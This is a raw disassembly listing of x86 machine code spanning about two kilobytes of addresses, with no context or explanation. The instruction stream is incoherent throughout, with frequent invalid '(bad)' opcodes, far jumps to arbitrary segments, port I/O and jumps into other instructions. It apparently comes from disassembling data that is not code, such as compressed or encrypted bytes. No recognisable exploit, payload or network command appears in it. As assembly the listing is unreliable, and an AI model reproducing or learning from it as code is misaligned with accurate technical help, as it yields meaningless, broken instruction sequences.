  40f4f6:	add    BYTE PTR [eax],al
  40f4f8:	mov    BYTE PTR [edx-0x5bf4ffac],dh
  40f4fe:	fdivr  st(5),st
  40f500:	sbb    bh,bh
  40f502:	add    eax,esi
  40f504:	test   al,0x3
  40f506:	jmp    0xb00:0x163988d6
  40f50d:	pushf  
  40f50e:	jle    0x40f4bf
  40f510:	jae    0x40f4d0
  40f512:	ins    BYTE PTR es:[edi],dx
  40f513:	scas   eax,DWORD PTR es:[edi]
  40f514:	jae    0x40f4e8
  40f516:	mov    al,ds:0x64ce73bf
  40f51b:	inc    esp
  40f51c:	mov    ebp,ebx
  40f51e:	cmp    DWORD PTR [eax],esp
  40f520:	je     0x40f55b
  40f522:	xor    DWORD PTR [eax],esp
  40f524:	and    BYTE PTR [eax],0xae
  40f527:	and    BYTE PTR [ebp+0x1985211f],0xd2
  40f52e:	popf   
  40f52f:	push   es
  40f530:	nop
  40f531:	mov    dl,0xf3
  40f533:	dec    BYTE PTR [edi+edx*4]
  40f536:	stc    
  40f537:	mov    bl,0xa
  40f539:	lahf   
  40f53a:	pop    esp
  40f53b:	adc    DWORD PTR [ecx-0x292901d5],edi
  40f541:	aaa    
  40f542:	pusha  
  40f543:	mov    eax,ds:0x8ce5b293
  40f548:	fsubr  DWORD PTR [esi-0x66703b82]
  40f54e:	test   BYTE PTR [eax-0x716b3547],0xcc
  40f555:	mov    dl,0x6c
  40f557:	dec    eax
  40f558:	ds add bh,dl
  40f55b:	mov    es,WORD PTR [eax]
  40f55d:	add    BYTE PTR [eax],al
  40f55f:	add    BYTE PTR [eax],al
  40f561:	daa    
  40f562:	xor    DWORD PTR [edi],ecx
  40f564:	pop    edx
  40f565:	mov    ds:0x9b518cd0,eax
  40f56a:	mov    cl,0x9a
  40f56c:	jmp    DWORD PTR [ebx+0x73bf7cc8]
  40f572:	retf   0xaf7c
  40f575:	mov    bl,0xc2
  40f577:	push   cs
  40f578:	pusha  
  40f579:	xchg   ecx,eax
  40f57a:	aaa    
  40f57b:	xchg   DWORD PTR [edi-0x1],eax
  40f57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f57f:	out    dx,eax
  40f580:	jo     0x40f55c
  40f582:	mov    al,0x85
  40f584:	daa    
  40f585:	pushf  
  40f586:	popa   
  40f587:	or     eax,0x5a3990c2
  40f58c:	add    eax,0xdcf002e4
  40f591:	imul   eax,ebx,0x4e
  40f594:	jmp    0x6392fca1
  40f599:	dec    ebp
  40f59a:	or     BYTE PTR [ebp+eiz*4-0x16fd8f78],cl
  40f5a1:	cld    
  40f5a2:	(bad)  
  40f5a3:	push   edi
  40f5a4:	jb     0x40f5e9
  40f5a6:	(bad)  
  40f5a7:	out    dx,eax
  40f5a8:	cld    
  40f5a9:	inc    ebx
  40f5aa:	ret    
  40f5ab:	dec    esi
  40f5ac:	jmp    0x82c47f35
  40f5b1:	je     0x40f5b7
  40f5b3:	sub    esi,edi
  40f5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5b6:	mov    bl,0xb8
  40f5b8:	das    
  40f5b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ba:	mov    bl,0xb8
  40f5bc:	pop    ds
  40f5bd:	mov    al,0xaf
  40f5bf:	(bad)  
  40f5c0:	sbb    bh,BYTE PTR [esi+0xd3fd9c]
  40f5c6:	add    BYTE PTR [eax],al
  40f5c8:	add    BYTE PTR [eax],al
  40f5ca:	jg     0x40f571
  40f5cc:	jp     0x40f5db
  40f5ce:	pusha  
  40f5cf:	aaa    
  40f5d0:	dec    eax
  40f5d1:	pop    es
  40f5d2:	ins    DWORD PTR es:[edi],dx
  40f5d3:	sbb    BYTE PTR [edx],0xea
  40f5d6:	int    0xf3
  40f5d8:	out    dx,eax
  40f5d9:	aam    0x6f
  40f5db:	mov    esi,0x700ce94e
  40f5e0:	add    ah,BYTE PTR [esp+edx*8+0x1f]
  40f5e4:	inc    esi
  40f5e5:	mul    BYTE PTR [ecx]
  40f5e7:	out    dx,al
  40f5e8:	sub    ah,BYTE PTR [esi+0x247caa8c]
  40f5ee:	push   ss
  40f5ef:	imul   BYTE PTR [edx]
  40f5f1:	imul   edi,DWORD PTR [ebx+0x23007be1],0xff9b8bb
  40f5fb:	icebp  
  40f5fc:	xchg   DWORD PTR [esi-0x2b],ecx
  40f5ff:	push   ss
  40f600:	sbb    al,0x8a
  40f602:	aaa    
  40f603:	(bad)  
  40f606:	icebp  
  40f607:	or     DWORD PTR [eax+0xf0070f],esi
  40f60d:	mov    dh,0x30
  40f60f:	sub    ecx,edi
  40f611:	stc    
  40f612:	jno    0x40f675
  40f614:	sub    ch,BYTE PTR [ebx-0x32]
  40f617:	xchg   ebx,eax
  40f618:	gs adc al,0xe
  40f61b:	je     0x40f648
  40f61d:	adc    al,0x2c
  40f61f:	jno    0x40f64a
  40f621:	add    esi,esi
  40f623:	pop    edi
  40f624:	lock adc eax,0x2fa04d
  40f62a:	cmp    ah,bl
  40f62c:	add    esi,DWORD PTR [ebx+0x0]
  40f632:	add    BYTE PTR [eax+0x1115f061],bh
  40f638:	sahf   
  40f639:	das    
  40f63a:	add    BYTE PTR [esi+0x68],ch
  40f63d:	test   ebx,eax
  40f63f:	mov    dl,0xec
  40f641:	or     eax,DWORD PTR [eax]
  40f643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f644:	xor    eax,0x61f257fe
  40f649:	pop    es
  40f64a:	inc    edx
  40f64b:	(bad)  
  40f64c:	fld    QWORD PTR [ebx]
  40f64e:	lea    edi,[edi]
  40f650:	mov    ds:0xb01067e7,eax
  40f655:	push   cs
  40f656:	test   BYTE PTR [ecx-0x5e7cf58c],ch
  40f65c:	or     ah,ch
  40f65e:	sub    DWORD PTR [edx+0x390c2b7b],edi
  40f664:	jae    0x40f67c
  40f666:	mov    esi,edi
  40f668:	mov    dh,0x63
  40f66a:	sar    BYTE PTR ds:0x30448ae,0xab
  40f671:	out    dx,eax
  40f672:	je     0x40f604
  40f674:	jne    0x40f671
  40f676:	dec    edi
  40f677:	pop    ds
  40f678:	sahf   
  40f679:	mov    bh,0x15
  40f67b:	rcr    BYTE PTR [ecx+0x209cc38a],1
  40f681:	into   
  40f682:	pop    es
  40f683:	adc    eax,0x4e890c51
  40f688:	xchg   ecx,eax
  40f689:	mov    dh,0x5d
  40f68b:	rcl    BYTE PTR [ebx+ecx*1-0x7c75e4aa],cl
  40f692:	dec    ebx
  40f693:	lods   al,BYTE PTR ds:[esi]
  40f694:	xchg   ecx,eax
  40f695:	test   BYTE PTR [ebp+0x0],al
  40f698:	add    BYTE PTR [eax],al
  40f69a:	add    BYTE PTR [eax],al
  40f69c:	mov    al,dh
  40f69e:	inc    ecx
  40f69f:	or     ebp,DWORD PTR [ebx+0x59]
  40f6a2:	push   es
  40f6a3:	push   edi
  40f6a4:	sbb    eax,0x97030ee3
  40f6a9:	cwde   
  40f6aa:	lock cmp cl,BYTE PTR [edi+0x55003e7]
  40f6b1:	jmp    0x9:0xff04e806
  40f6b8:	mov    ebx,0x14c01d96
  40f6bd:	pop    ecx
  40f6be:	fimul  WORD PTR [edi]
  40f6c0:	xchg   edi,eax
  40f6c1:	fiadd  DWORD PTR [edx]
  40f6c3:	mov    esp,esi
  40f6c5:	mov    ds:0x1494d1e4,eax
  40f6ca:	dec    eax
  40f6cb:	out    0x83,eax
  40f6cd:	hlt    
  40f6ce:	or     DWORD PTR [eax],eax
  40f6d0:	xlat   BYTE PTR ds:[ebx]
  40f6d1:	jns    0x40f720
  40f6d3:	add    edx,DWORD PTR [eax-0x73dc40dc]
  40f6d9:	les    edi,FWORD PTR [ecx-0x7d7e1cf9]
  40f6df:	push   eax
  40f6e0:	mov    BYTE PTR [ebp+edi*1+0xecb130b],al
  40f6e7:	call   0x4a2b4b
  40f6ec:	push   edx
  40f6ed:	cwde   
  40f6ee:	or     esi,DWORD PTR [ebx]
  40f6f0:	push   eax
  40f6f1:	mov    bl,0x23
  40f6f3:	or     al,0x90
  40f6f5:	or     al,0xe4
  40f6f7:	mov    ebx,0x4de5af51
  40f6fc:	rcl    esi,cl
  40f6fe:	jmp    0x40f707
  40f703:	add    BYTE PTR [eax],al
  40f705:	mov    esi,0x953ef62d
  40f70a:	push   cs
  40f70b:	mov    eax,ds:0xe32607c3
  40f710:	imul   esi,DWORD PTR [ebx+ecx*2+0x790b03e6],0x47
  40f718:	inc    edx
  40f719:	xchg   ebx,eax
  40f71a:	mov    dl,0x7c
  40f71c:	(bad)  
  40f71d:	mov    bl,0xb6
  40f71f:	into   
  40f720:	push   esi
  40f721:	aaa    
  40f722:	mov    ah,0xe5
  40f724:	mov    cl,BYTE PTR [ebx-0x2a]
  40f727:	loope  0x40f795
  40f729:	pushf  
  40f72a:	dec    ebx
  40f72b:	out    0x3,al
  40f72d:	popa   
  40f72e:	add    eax,0x2d64396d
  40f733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f734:	adc    bh,0xb5
  40f737:	das    
  40f738:	scas   eax,DWORD PTR es:[edi]
  40f739:	sbb    bh,ch
  40f73b:	leave  
  40f73c:	repz adc cl,BYTE PTR [ebx-0x1595301b]
  40f743:	sbb    DWORD PTR ds:0x8ad12648,esp
  40f749:	rcl    esi,cl
  40f74b:	rol    DWORD PTR [eax-0x99e4eb9],1
  40f751:	nop
  40f752:	mov    dl,0xe5
  40f754:	ds ja  0x40f75f
  40f757:	out    0x3,al
  40f759:	nop
  40f75a:	mov    edi,ecx
  40f75c:	add    al,0x90
  40f75e:	mov    dl,0x9a
  40f760:	add    edx,DWORD PTR [eax-0x7495da4e]
  40f766:	pop    edi
  40f767:	in     eax,0x3
  40f769:	add    BYTE PTR [eax],al
  40f76b:	add    BYTE PTR [eax],al
  40f76d:	add    BYTE PTR [eax+0x5005cf2],dl
  40f773:	mov    dl,0xe
  40f775:	jmp    0x2ac42a0d
  40f77a:	sbb    DWORD PTR [ecx-0x2a6c16f8],esp
  40f780:	int3   
  40f781:	pusha  
  40f782:	xchg   ebx,eax
  40f783:	mov    dh,0xe
  40f785:	jmp    0xc1b06b04
  40f78a:	inc    edi
  40f78b:	ror    BYTE PTR [ecx+0x31bddf29],cl
  40f791:	jmp    0x7d4faa22
  40f796:	add    esi,ebx
  40f798:	push   cs
  40f799:	jmp    0x40f72e
  40f79b:	mov    dl,0x7a
  40f79d:	aas    
  40f79e:	xchg   DWORD PTR [edx+0x2793e90b],esi
  40f7a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a5:	inc    ebx
  40f7a6:	xchg   edx,eax
  40f7a7:	lea    ecx,[eax]
  40f7a9:	inc    ebx
  40f7aa:	nop
  40f7ab:	lea    ecx,[ebx+edx*2]
  40f7ae:	xchg   ecx,eax
  40f7af:	add    esp,esp
  40f7b1:	aam    0x9e
  40f7b3:	mov    dl,0x9
  40f7b5:	jmp    0xec451e4d
  40f7ba:	xchg   ebx,eax
  40f7bb:	mov    eax,0xe4dfe90e
  40f7c0:	xor    ebp,DWORD PTR [ebx-0x69c4d529]
  40f7c6:	fisttp QWORD PTR [edx]
  40f7c8:	pop    es
  40f7c9:	add    ecx,DWORD PTR [ecx+eiz*4-0xbef2ec7]
  40f7d0:	push   cs
  40f7d1:	jle    0x40f7d3
  40f7d3:	add    BYTE PTR [eax],al
  40f7d5:	add    BYTE PTR [eax],al
  40f7d7:	ja     0x40f801
  40f7d9:	sbb    eax,0xfe2b9429
  40f7de:	fs (bad) 
  40f7e0:	es adc al,0x72
  40f7e3:	push   eax
  40f7e4:	aam    0x12
  40f7e6:	fs int3 
  40f7e8:	mov    al,0x8a
  40f7ea:	jns    0x40f780
  40f7ec:	mov    dl,0xe
  40f7ee:	mov    WORD PTR es:[edx-0x4bc6fff2],gs
  40f7f5:	in     eax,0x85
  40f7f7:	cmp    DWORD PTR [esi+ecx*1-0x46f4d396],esi
  40f7fe:	push   0x2d
  40f800:	mov    ch,bh
  40f802:	dec    BYTE PTR [esp+ecx*8-0x75]
  40f806:	inc    esp
  40f807:	cmp    DWORD PTR [edi],eax
  40f809:	sbb    edi,DWORD PTR [eax+0x1b]
  40f80c:	je     0x40f7fd
  40f80e:	test   BYTE PTR [ecx-0x7e],ch
  40f811:	or     al,BYTE PTR [ebx+0x2e50701]
  40f817:	dec    edx
  40f818:	hlt    
  40f819:	into   
  40f81a:	jmp    0x40f806
  40f81c:	xor    ebp,esp
  40f81e:	add    DWORD PTR [eax-0x60],esi
  40f821:	xchg   DWORD PTR [esi-0x3],ebx
  40f824:	and    BYTE PTR [eax+0x4b2ae975],dh
  40f82a:	and    al,0xe5
  40f82c:	and    BYTE PTR [eax-0x10224e8c],dh
  40f832:	pop    es
  40f833:	mov    ecx,0x79eb0eb3
  40f838:	mov    gs,WORD PTR [edi+0x0]
  40f83b:	add    BYTE PTR [eax],al
  40f83d:	add    BYTE PTR [eax],al
  40f83f:	add    BYTE PTR [ecx-0x5595a84d],ch
  40f845:	push   eax
  40f846:	lock je 0x40f826
  40f849:	rol    DWORD PTR [ebx+0x127a01c8],cl
  40f84f:	add    ch,BYTE PTR [ecx-0x528b4fe1]
  40f855:	sub    cl,cl
  40f857:	jmp    0x40f8c0
  40f859:	sub    dh,BYTE PTR [ebx+0x24]
  40f85c:	gs and cl,dh
  40f85f:	je     0x40f8d2
  40f861:	push   es
  40f862:	sbb    edx,DWORD PTR [eax-0x77108ca5]
  40f868:	jle    0x40f894
  40f86a:	xor    DWORD PTR [ebp-0x74fe903a],eax
  40f870:	nop
  40f871:	fsub   DWORD PTR [ebx+0x41]
  40f874:	jne    0x40f801
  40f876:	or     ecx,DWORD PTR [ebx-0x59b5fea1]
  40f87c:	xchg   ecx,eax
  40f87d:	mov    DWORD PTR [esi-0x6d2fd733],eax
  40f883:	add    BYTE PTR [eax-0x3001bbf4],dl
  40f889:	ja     0x40f843
  40f88b:	pop    edx
  40f88c:	leave  
  40f88d:	retf   
  40f88e:	add    eax,DWORD PTR [eax]
  40f890:	adc    eax,0x133dbfd2
  40f895:	ret    0x735a
  40f898:	leave  
  40f899:	push   cs
  40f89a:	ds jae 0x40f85a
  40f89d:	or     al,0xd8
  40f89f:	and    edx,DWORD PTR [ecx+ecx*4+0x886]
  40f8a6:	add    BYTE PTR [eax],al
  40f8a8:	add    BYTE PTR [ebp-0x6d],dh
  40f8ab:	in     eax,0x56
  40f8ad:	out    dx,eax
  40f8ae:	popf   
  40f8af:	pop    edi
  40f8b0:	adc    DWORD PTR [eax-0x77],edx
  40f8b3:	push   eax
  40f8b4:	or     eax,0x426fcdf
  40f8b9:	inc    edx
  40f8ba:	jno    0x40f912
  40f8bc:	sbb    al,0x92
  40f8be:	mov    DWORD PTR [esi-0x4b49b641],eax
  40f8c4:	mov    al,BYTE PTR [ebp+ebp*4+0xe]
  40f8c8:	test   DWORD PTR [esi-0x7a010d1c],edi
  40f8ce:	sbb    ecx,edi
  40f8d0:	aas    
  40f8d1:	nop
  40f8d2:	and    al,BYTE PTR ds:0x7096ab5e
  40f8d8:	inc    ebx
  40f8d9:	ins    BYTE PTR es:[edi],dx
  40f8da:	xchg   ecx,eax
  40f8db:	xchg   BYTE PTR [edi-0xbb71fc],bh
  40f8e1:	fimul  WORD PTR [ebx+0x5413000b]
  40f8e7:	pop    ebx
  40f8e8:	ror    DWORD PTR [eax+0x7c8ab68b],0xb3
  40f8ef:	mov    dh,0xb9
  40f8f1:	sbb    ah,BYTE PTR [eax+edi*4+0x4f38597e]
  40f8f8:	fadd   st,st(6)
  40f8fa:	xor    DWORD PTR [edi],edi
  40f8fc:	push   ebx
  40f8fd:	ret    
  40f8fe:	call   0xf5044c65
  40f903:	rcl    BYTE PTR gs:[ebx+0xb00b1b2],cl
  40f90a:	lods   eax,DWORD PTR ds:[esi]
  40f90b:	retf   
  40f90c:	add    eax,0x0
  40f911:	add    BYTE PTR [edx+0x38039bb2],bh
  40f917:	push   ds
  40f918:	repz add eax,0x7edf2990
  40f91e:	pushf  
  40f91f:	stos   BYTE PTR es:[edi],al
  40f920:	mov    eax,DWORD PTR [ebx]
  40f922:	sbb    eax,0x5db509f0
  40f927:	add    eax,0xc7ff13f1
  40f92c:	mov    ebp,0x6ab2b7f5
  40f931:	inc    esp
  40f932:	arpl   WORD PTR [ebx+0x27ebd92e],bp
  40f938:	jmp    0x5c7f:0x689d57e
  40f93f:	scas   al,BYTE PTR es:[edi]
  40f940:	push   0x59
  40f942:	inc    ebx
  40f943:	(bad)
  40f946:	pop    ss
  40f947:	shl    DWORD PTR ds:0xccb50904,0x0
  40f94e:	or     edi,eax
  40f950:	ror    DWORD PTR [eax+0x4ae026ef],1
  40f956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f957:	add    al,0xe6
  40f959:	add    edx,DWORD PTR [eax+0x3652ad31]
  40f95f:	cld    
  40f960:	scas   al,BYTE PTR es:[edi]
  40f961:	inc    ebp
  40f962:	xchg   edi,eax
  40f963:	mov    dl,0x12
  40f965:	jg     0x40f9e2
  40f967:	add    edx,DWORD PTR [edi]
  40f969:	mov    edx,0x6c0ea30a
  40f96e:	fldenv [ecx]
  40f970:	outs   dx,BYTE PTR ds:[esi]
  40f971:	push   0xffffffc1
  40f973:	pushf  
  40f974:	jp     0x40f93b
  40f976:	add    BYTE PTR [eax],al
  40f978:	add    BYTE PTR [eax],al
  40f97a:	add    dh,ah
  40f97c:	test   BYTE PTR [esi],0x1a
  40f97f:	popf   
  40f980:	enter  0xddcd,0x60
  40f984:	cmc    
  40f985:	jp     0x40f97d
  40f987:	or     esp,DWORD PTR [ecx]
  40f989:	add    BYTE PTR [edx+0x50],dh
  40f98c:	test   eax,0x673089
  40f991:	enter  0xfae8,0x9c
  40f995:	out    dx,eax
  40f996:	jmp    0xeba5e269
  40f99b:	hlt    
  40f99c:	xchg   DWORD PTR [ebx],ecx
  40f99e:	ficomp DWORD PTR [edx+esi*8-0x7d]
  40f9a2:	sub    ebx,esp
  40f9a4:	daa    
  40f9a5:	add    BYTE PTR [eax+0x45],dh
  40f9a8:	in     eax,dx
  40f9a9:	out    0xfb,al
  40f9ab:	div    BYTE PTR [edx+0x2153650e]
  40f9b1:	sbb    esp,DWORD PTR [edx-0x6f]
  40f9b4:	das    
  40f9b5:	dec    ecx
  40f9b6:	icebp  
  40f9b7:	and    dl,BYTE PTR [ebp-0x4d71fa61]
  40f9bd:	mov    ch,BYTE PTR [ecx+0x2c83b5b8]
  40f9c3:	inc    esp
  40f9c4:	mov    BYTE PTR ds:0x89a8e762,ch
  40f9ca:	mov    edi,0xd4efc3e8
  40f9cf:	inc    ebx
  40f9d0:	ret    
  40f9d1:	dec    esi
  40f9d2:	jmp    0xdd24b111
  40f9d7:	sub    al,0xf6
  40f9d9:	add    ch,BYTE PTR [esp+ecx*2+0x21]
  40f9dd:	or     DWORD PTR [esi+0x0],esp
  40f9e3:	add    BYTE PTR [ebp+eax*1+0x3193e90f],dl
  40f9ea:	(bad)  
  40f9eb:	mov    es,WORD PTR [edx+0x6b]
  40f9ee:	int3   
  40f9ef:	add    BYTE PTR [ecx-0x774a750],al
  40f9f5:	xor    eax,0xf8e4ffc7
  40f9fa:	jnp    0x40fa21
  40f9fc:	and    al,BYTE PTR [eax]
  40f9fe:	jl     0x40fa21
  40fa00:	es pop ds
  40fa02:	xor    al,BYTE PTR [ebp-0x74fe8542]
  40fa08:	scas   al,BYTE PTR es:[edi]
  40fa09:	dec    ch
  40fa0b:	sbb    edi,DWORD PTR [ebx]
  40fa0d:	mov    al,0x83
  40fa0f:	iret   
  40fa10:	loope  0x40fa82
  40fa12:	test   eax,0xc21f2901
  40fa17:	call   0x4f4402
  40fa1c:	sub    dh,al
  40fa1e:	push   eax
  40fa1f:	pop    esi
  40fa20:	jp     0x40fa55
  40fa22:	fnsave [edi+esi*1-0x15]
  40fa26:	or     eax,0xeb02957
  40fa2b:	pop    esi
  40fa2c:	mov    edx,0x82ec8463
  40fa31:	pop    ebx
  40fa32:	pop    ss
  40fa33:	or     DWORD PTR [ebp-0x16fff262],0xfcf88b1c
  40fa3d:	add    dh,cl
  40fa3f:	push   eax
  40fa40:	out    dx,al
  40fa41:	test   BYTE PTR [edi],al
  40fa43:	call   0x4faed4
  40fa48:	add    BYTE PTR [eax],al
  40fa4a:	add    BYTE PTR [eax],al
  40fa4c:	add    BYTE PTR [ebp-0x11],ah
  40fa4f:	jnp    0x40fa65
  40fa51:	fiadd  WORD PTR [ebx+ebx*1+0x5db2a48b]
  40fa58:	lea    ebp,[edi+eiz*8]
  40fa5b:	repnz (bad) 
  40fa5d:	(bad)  
  40fa5e:	div    edi
  40fa60:	cld    
  40fa61:	inc    BYTE PTR [edx]
  40fa63:	mov    ebx,0x851b7422
  40fa69:	jmp    0x910803f1
  40fa6e:	mov    DWORD PTR [esi-0x75767001],esi
  40fa74:	mov    DWORD PTR [edi+0x4fe4a62],0xdc8afb76
  40fa7e:	ins    DWORD PTR es:[edi],dx
  40fa7f:	out    dx,eax
  40fa80:	(bad)  
  40fa81:	in     al,0x75
  40fa83:	sti    
  40fa84:	mov    dl,ah
  40fa86:	lods   eax,DWORD PTR ds:[esi]
  40fa87:	push   cs
  40fa88:	call   0xfe9ff63d
  40fa8d:	push   ebx
  40fa8e:	add    al,0xd8
  40fa90:	and    esp,DWORD PTR [eax-0x6bdc47f0]
  40fa96:	hlt    
  40fa97:	xlat   BYTE PTR ds:[ebx]
  40fa98:	and    esp,DWORD PTR [eax-0x7bdc4fe0]
  40fa9e:	icebp  
  40fa9f:	jmp    0x40fa9e
  40faa1:	das    
  40faa2:	int3   
  40faa3:	dec    edx
  40faa4:	mov    bh,BYTE PTR [ebp+ebp*2+0x75cc8af3]
  40faab:	pop    es
  40faac:	jmp    0xfe9fbf80
  40fab1:	add    BYTE PTR [eax],al
  40fab3:	add    BYTE PTR [eax],al
  40fab5:	add    BYTE PTR [edi],cl
  40fab7:	inc    ebp
  40fab8:	daa    
  40fab9:	adc    BYTE PTR [ebx],bl
  40fabb:	cmp    eax,0x24ff0c27
  40fac0:	sub    BYTE PTR [eax],dl
  40fac2:	or     edx,DWORD PTR [ebp+0x27]
  40fac5:	or     al,0xf8
  40fac7:	fcomp  DWORD PTR [ebp-0x2]
  40faca:	out    0x47,eax
  40facc:	mov    ch,0x8a
  40face:	in     al,dx
  40facf:	pop    ds
  40fad0:	into   
  40fad1:	movups XMMWORD PTR [ebp-0xe],xmm6
  40fad5:	add    DWORD PTR [eax-0x377b7177],edx
  40fadb:	jne    0x40fb1c
  40fadd:	(bad)  
  40fade:	pusha  
  40fadf:	pop    esp
  40fae0:	aad    0x7
  40fae2:	test   al,0x1
  40fae4:	or     al,BYTE PTR [eax]
  40fae6:	nop
  40fae7:	adc    eax,0xb283734b
  40faec:	jp     0x40fa6f
  40faee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faef:	pushf  
  40faf0:	nop
  40faf1:	dec    edi
  40faf2:	scas   eax,DWORD PTR es:[edi]
  40faf3:	xchg   bh,dh
  40faf5:	add    DWORD PTR [eax-0x6c275ad2],edx
  40fafb:	in     eax,0xa5
  40fafd:	cmp    eax,0x4fbd3652
  40fb02:	dec    eax
  40fb03:	jbe    0x40fb6b
  40fb05:	pusha  
  40fb06:	lahf   
  40fb07:	mov    ah,0xe5
  40fb09:	add    eax,ebx
  40fb0b:	jmp    FWORD PTR [edi+0x62b5e9b6]
  40fb11:	fdiv   DWORD PTR [ebx-0x36264742]
  40fb17:	cld    
  40fb18:	retf   
  40fb19:	in     al,0x0
  40fb1b:	add    BYTE PTR [eax],al
  40fb1d:	add    BYTE PTR [eax],al
  40fb1f:	call   0x911b38ae
  40fb24:	mov    dl,0xc7
  40fb26:	jl     0x40fab5
  40fb28:	daa    
  40fb29:	scas   eax,DWORD PTR es:[edi]
  40fb2a:	add    edi,ebx
  40fb2c:	pop    ds
  40fb2d:	xor    dl,BYTE PTR [ebx]
  40fb2f:	push   eax
  40fb30:	adc    DWORD PTR [edi-0x38],edi
  40fb33:	jae    0x40faf5
  40fb35:	jl     0x40fabf
  40fb37:	jae    0x40faff
  40fb39:	jecxz  0x40fb3e
  40fb3b:	nop
  40fb3c:	xor    eax,0x1f91079d
  40fb41:	jecxz  0x40fbbd
  40fb43:	outs   dx,DWORD PTR ds:[esi]
  40fb44:	stos   BYTE PTR es:[edi],al
  40fb45:	sbb    al,0x2
  40fb47:	ret    
  40fb48:	mov    al,ds:0xbab3c86a
  40fb4d:	xchg   ebp,eax
  40fb4e:	pop    ebx
  40fb4f:	stos   DWORD PTR es:[edi],eax
  40fb50:	or     al,0xe7
  40fb52:	add    eax,DWORD PTR [eax+0x27]
  40fb55:	sub    DWORD PTR [eax],ebp
  40fb57:	js     0x40fb5b
  40fb59:	imul   eax,DWORD PTR [ebp+0x3e5ae75],0x60
  40fb60:	cdq    
  40fb61:	rcr    BYTE PTR [ebx],cl
  40fb63:	mov    ds:0xf788e5f2,al
  40fb68:	push   ds
  40fb69:	(bad)  
  40fb6c:	imul   BYTE PTR [edx]
  40fb6e:	shl    ebx,1
  40fb70:	cwde   
  40fb71:	sbb    DWORD PTR [ebp+0x720ed9a2],ebp
  40fb77:	inc    ebx
  40fb78:	es dec edx
  40fb7a:	int    0x7b
  40fb7c:	fdiv   st(6),st
  40fb7e:	adc    eax,0xcda22c40
  40fb83:	add    BYTE PTR [eax],al
  40fb85:	add    BYTE PTR [eax],al
  40fb87:	add    BYTE PTR [edi-0x516f14c],dh
  40fb8d:	cmp    eax,0xb291c12a
  40fb92:	push   cs
  40fb93:	bound  esp,QWORD PTR [ebp+0x1067cb34]
  40fb99:	push   ss
  40fb9a:	or     eax,0xd033151
  40fb9f:	jmp    0xcb754bc
  40fba4:	mov    ds:0x2985d6b,eax
  40fba9:	add    BYTE PTR [edi-0x69],bl
  40fbac:	cld    
  40fbad:	add    eax,esi
  40fbaf:	fadd   st(7),st
  40fbb1:	ret    
  40fbb2:	dec    esi
  40fbb3:	jmp    0xd0b154d0
  40fbb8:	or     BYTE PTR [eax+esi*2-0x12],bh
  40fbbc:	adc    ebx,DWORD PTR ds:0x1e931608
  40fbc2:	pop    es
  40fbc3:	rcl    BYTE PTR [edx+0x16],cl
  40fbc6:	adc    eax,0xeb1972f
  40fbcb:	xchg   ebx,eax
  40fbcc:	xchg   ecx,eax
  40fbcd:	or     cl,BYTE PTR [ebx]
  40fbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbd0:	rcr    DWORD PTR [eax-0x32011a6],cl
  40fbd6:	sbb    BYTE PTR [ecx],ch
  40fbd8:	xchg   esp,eax
  40fbd9:	in     eax,0xce
  40fbdb:	push   0x48
  40fbdd:	lods   eax,DWORD PTR ds:[esi]
  40fbde:	dec    esi
  40fbdf:	ret    0xe592
  40fbe2:	into   
  40fbe3:	cs div ch
  40fbe6:	push   ebx
  40fbe7:	add    BYTE PTR [eax],ch
  40fbe9:	jmp    0x0:0x1ff
  40fbf0:	add    BYTE PTR [ecx-0x6cc344c],ch
  40fbf6:	ins    DWORD PTR es:[edi],dx
  40fbf7:	int3   
  40fbf8:	xor    edi,ecx
  40fbfa:	repnz pop edx
  40fbfc:	mov    eax,DWORD PTR ds:0x5a3ce333
  40fc02:	sbb    edx,DWORD PTR [ebx+0x1c]
  40fc05:	iret   
  40fc06:	pop    ebp
  40fc07:	pop    esp
  40fc08:	call   FWORD PTR [esi+eax*4+0x5d9eff3c]
  40fc0f:	lock jne 0x40fb93
  40fc12:	cld    
  40fc13:	cmp    al,0xfe
  40fc15:	out    0xe5,al
  40fc17:	test   al,dh
  40fc19:	cli    
  40fc1a:	jmp    0x8362:0x7abf851b
  40fc21:	mov    bh,0xe5
  40fc23:	jnp    0x40fc8d
  40fc25:	mov    dl,0x98
  40fc27:	adc    BYTE PTR [ebp+0x6d],0x64
  40fc2b:	lock xor esi,edx
  40fc2e:	lahf   
  40fc2f:	rcl    DWORD PTR [ecx],cl
  40fc31:	jmp    0xed0185e9
  40fc36:	xchg   esi,eax
  40fc37:	test   BYTE PTR [ebp+0x41],dl
  40fc3a:	sbb    eax,edx
  40fc3c:	call   0x31e3a8
  40fc41:	stos   BYTE PTR es:[edi],al
  40fc42:	(bad)  
  40fc43:	lock jmp 0x40fc84
  40fc46:	sbb    DWORD PTR [ebx-0x8],ecx
  40fc49:	dec    ecx
  40fc4a:	sbb    DWORD PTR [ebx-0x28],ecx
  40fc4d:	sbb    edi,esp
  40fc4f:	sbb    al,ah
  40fc51:	(bad)  [ebx-0x11]
  40fc54:	test   BYTE PTR [eax],al
  40fc56:	add    BYTE PTR [eax],al
  40fc58:	add    BYTE PTR [eax],al
  40fc5a:	mov    ecx,0x5cfeff7a
  40fc5f:	mov    ds:0xe6f14582,eax
  40fc64:	jp     0x40fc72
  40fc66:	cdq    
  40fc67:	in     eax,0x1a
  40fc69:	test   al,0x90
  40fc6b:	fwait
  40fc6c:	retf   
  40fc6d:	call   FWORD PTR [edx]
  40fc6f:	iret   
  40fc70:	inc    esi
  40fc71:	mov    cl,BYTE PTR [ebp+0x75]
  40fc74:	mov    ds,edi
  40fc76:	outs   dx,DWORD PTR ds:[esi]
  40fc77:	out    dx,eax
  40fc78:	jae    0x40fc7a
  40fc7a:	adc    esp,ebp
  40fc7c:	push   es
  40fc7d:	add    DWORD PTR ds:0x887a768c,ebx
  40fc83:	or     ebx,eax
  40fc85:	adc    edx,DWORD PTR [ecx+0x100cf2be]
  40fc8b:	mov    DWORD PTR [ebx],ecx
  40fc8d:	add    dh,ch
  40fc8f:	adc    cl,BYTE PTR ds:0xa0d0568b
  40fc95:	pop    edx
